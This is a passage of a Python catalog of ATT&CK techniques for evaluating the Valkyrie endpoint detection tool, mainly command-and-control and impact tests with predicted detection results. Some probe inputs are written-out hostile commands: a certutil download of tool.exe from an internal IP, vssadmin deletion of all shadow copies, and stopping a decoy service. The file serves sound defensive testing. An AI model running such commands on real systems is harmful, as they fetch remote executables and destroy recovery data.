              "which is NOT the same as a user-authored always_block rule "
              "(category='user_rule'). Per the evaluation's explicit rule, "
              "only user_rule-category hits are excluded from the behavioral "
              "count; a match against Valkyrie's own automated blocklist "
              "counts as a real (if list-based, not learned) detection, and "
              "is labeled as such rather than folded into 'behavioral'.",
    ),
    Technique(
        id="c2-dga-domain", technique_id="T1071.004",
        technique_name="Application Layer Protocol: DNS (DGA-generated domain)",
        tactic="Command and Control",
        art_test_ref="Custom -- algorithmically-generated C2 domain",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/dga.py:classify_dga -> dns_interceptor pipeline",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="dga", probe_input={"domain": "xk4j9zq2plyw7vbn.info"},
        notes="Genuine behavioral/statistical detection -- not list-based.",
    ),
    Technique(
        id="c2-hardcoded-ip", technique_id="T1071",
        technique_name="Hardcoded-IP C2 (no DNS lookup at all)",
        tactic="Command and Control",
        art_test_ref="Custom -- raw connect() to a threat-intel-flagged IP",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/network_telemetry.py:classify_connection "
                       "-- explicitly designed for exactly this case",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="network", probe_input={"ip": "45.9.148.99", "port": 443,
                                      "blocked": True},
        notes="This is the case DNS-only detection structurally cannot see. "
              "Its own docstring says so.",
    ),
    Technique(
        id="c2-dns-tunneling", technique_id="T1071.004",
        technique_name="DNS Tunneling / high-volume subdomain queries",
        tactic="Command and Control",
        art_test_ref="Custom -- iodine/dnscat2-style query flood",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_INLINE,
        detector_path="valkyrie/dns_tunnel.py:SubdomainFloodDetector",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="dns_tunnel", probe_input={
            "base": "tunnel.example.com", "n_labels": 40},
        notes="",
    ),
    Technique(
        id="c2-ingress-tool-transfer", technique_id="T1105",
        technique_name="Ingress Tool Transfer (certutil -urlcache download)",
        tactic="Command and Control", art_test_ref="T1105 Test #1",
        destructive=False, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: certutil-download rule",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "certutil.exe", "parent": "cmd.exe",
            "cmdline": "certutil.exe -urlcache -split -f "
                       "http://10.0.0.5/tool.exe tool.exe", "path": ""},
        notes="Same process-poll race as the other LOLBin rules -- BUT this "
              "same download almost always ALSO produces an outbound "
              "connection/DNS lookup to the hosting domain, which the C2 "
              "path (DNS/network, inline, reliable) may independently catch. "
              "Scored on the process-side rule alone since that is what this "
              "entry targets; the DNS-side catch is credited separately if "
              "the hosting domain is itself flagged.",
    ),
]

# =============================================================================
# IMPACT -- Valkyrie's most purpose-built defense, and a real gap alongside it
# =============================================================================
IMPACT = [
    Technique(
        id="impact-ransomware-encrypt", technique_id="T1486",
        technique_name="Data Encrypted for Impact (canary-directory encryption)",
        tactic="Impact", art_test_ref="Custom -- rapid high-entropy overwrite "
                                      "of canary files (ransomware simulation)",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PURPOSE_BUILT,
        detector_path="valkyrie/ransomware_shield.py (canary tripwires + "
                       "entropy watcher) + behavioral_sequences.py "
                       "'ransomware' ESP sequence",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ransomware", probe_input={"payload": "random_high_entropy"},
        notes="Valkyrie's most mature, purpose-built detector. Genuinely "
              "expected to be strong here -- this is the one place a "
              "confident DETECT is warranted, not merely hoped for.",
    ),
    Technique(
        id="impact-shadow-delete", technique_id="T1490",
        technique_name="Inhibit System Recovery (vssadmin delete shadows)",
        tactic="Impact", art_test_ref="T1490 Test #1",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_PROCESS_POLL_RACY,
        detector_path="valkyrie/behavioral_rules.py: vssadmin-delete rule "
                       "(CRITICAL severity)",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "vssadmin.exe", "parent": "cmd.exe",
            "cmdline": "vssadmin.exe delete shadows /all /quiet", "path": ""},
        notes="Short-lived native command, same wiring gap. Notable because "
              "this is a CRITICAL-severity rule that, if this atomic runs "
              "standalone (not chained after a ransomware encryption phase "
              "the canary already caught), is likely to go completely unseen.",
    ),
    Technique(
        id="impact-service-stop", technique_id="T1489",
        technique_name="Service Stop (targeting a security-relevant service)",
        tactic="Impact",
        art_test_ref="T1489 Test #1 -- IMPORTANT: target a DECOY service, "
                     "never Valkyrie's own service, in any live run",
        destructive=True, live_vm_safe=True,
        delivery=DELIVERY_NONE, detector_path="NONE",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "sc.exe", "parent": "cmd.exe",
            "cmdline": "sc.exe stop DecoySecurityService", "path": ""},
        notes="No rule for service-stop targeting security tooling at all. "
              "Real gap, and one with a fix that does not depend on the "
              "poller (see root_cause.py) -- a periodic critical-service "
              "state check, analogous to the persistence artifact scanner.",
    ),
]

# =============================================================================
# OUT OF SCOPE -- named and reasoned, not silently dropped
# =============================================================================
OUT_OF_SCOPE = [
    Technique(
        id="oos-ntds-dump", technique_id="T1003.003",
        technique_name="OS Credential Dumping: NTDS.dit",
        tactic="Credential Access", art_test_ref="T1003.003",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Requires a Domain Controller. A single "
            "standalone-workstation VM cannot host this test at all, let "
            "alone safely.",
        predicted_tier_b="N/A",
    ),
    Technique(
        id="oos-data-destruction", technique_id="T1485",
        technique_name="Data Destruction (recursive file deletion)",
        tactic="Impact", art_test_ref="T1485",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Genuinely destructive with a real blast-radius "
            "risk even inside a VM if the target path is misconfigured. "
            "Excluded from the automated catalog; if run at all, do it "
            "manually against a throwaway directory, never via the batch "
            "runner.",
        predicted_tier_b="N/A",
    ),
    Technique(
        id="oos-account-lockout", technique_id="T1531",
        technique_name="Account Access Removal",
        tactic="Impact", art_test_ref="T1531",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Can lock the VM's own operator out of the "
            "session it needs to read results from. Excluded.",
        predicted_tier_b="N/A",
    ),
    Technique(
        id="oos-inhibit-recovery-bcdedit", technique_id="T1490",
        technique_name="Inhibit System Recovery (bcdedit boot config tampering)",
        tactic="Impact", art_test_ref="T1490 Test #4",
        destructive=True, live_vm_safe=False,
        out_of_scope_reason="Can break the VM's ability to boot at all, "
            "which defeats snapshot-revert if the snapshot was taken after "
            "boot config was already live-modified. The vssadmin variant "
            "above covers this technique's detection surface far more safely.",
        predicted_tier_b="N/A",
    ),
]

ALL_TACTICS = {
    "Execution": EXECUTION,
    "Persistence": PERSISTENCE,
    "Defense Evasion": DEFENSE_EVASION,
    "Credential Access": CREDENTIAL_ACCESS,
    "Discovery": DISCOVERY,
    "Lateral Movement": LATERAL_MOVEMENT,
    "Command and Control": COMMAND_AND_CONTROL,
    "Impact": IMPACT,
}


def all_in_scope() -> list[Technique]:
    out: list[Technique] = []
    for techs in ALL_TACTICS.values():
        out.extend(t for t in techs if t.in_scope())
    return out


def all_including_out_of_scope() -> list[Technique]:
    out: list[Technique] = []
    for techs in ALL_TACTICS.values():
        out.extend(techs)
    out.extend(OUT_OF_SCOPE)
    return out


def export_json(path: str) -> None:
    """Dump the in-scope catalog to JSON -- the ONE source of truth both
    replay_harness.py (Python) and run_live_evaluation.ps1 (PowerShell) read
    from, so the 40 technique definitions are never hand-duplicated in two
    languages and cannot drift out of sync between tiers."""
    import json
    data = {"catalog_version": CATALOG_VERSION,
           "techniques": [t.as_dict() for t in all_in_scope()],
           "out_of_scope": [t.as_dict() for t in OUT_OF_SCOPE]}
    Path(path).write_text(json.dumps(data, indent=2), encoding="utf-8")
    print(f"Exported {len(data['techniques'])} techniques to {path}")


if __name__ == "__main__":
    if len(sys.argv) > 2 and sys.argv[1] == "--export":
        export_json(sys.argv[2])
    else:
        in_scope = all_in_scope()
        print(f"Catalog version {CATALOG_VERSION}")
        print(f"{len(in_scope)} in-scope techniques across {len(ALL_TACTICS)} tactics")
        print(f"{len(OUT_OF_SCOPE)} explicitly out-of-scope (reasons given)")
        for tactic, techs in ALL_TACTICS.items():
            print(f"  {tactic:<22} {len(techs)}")
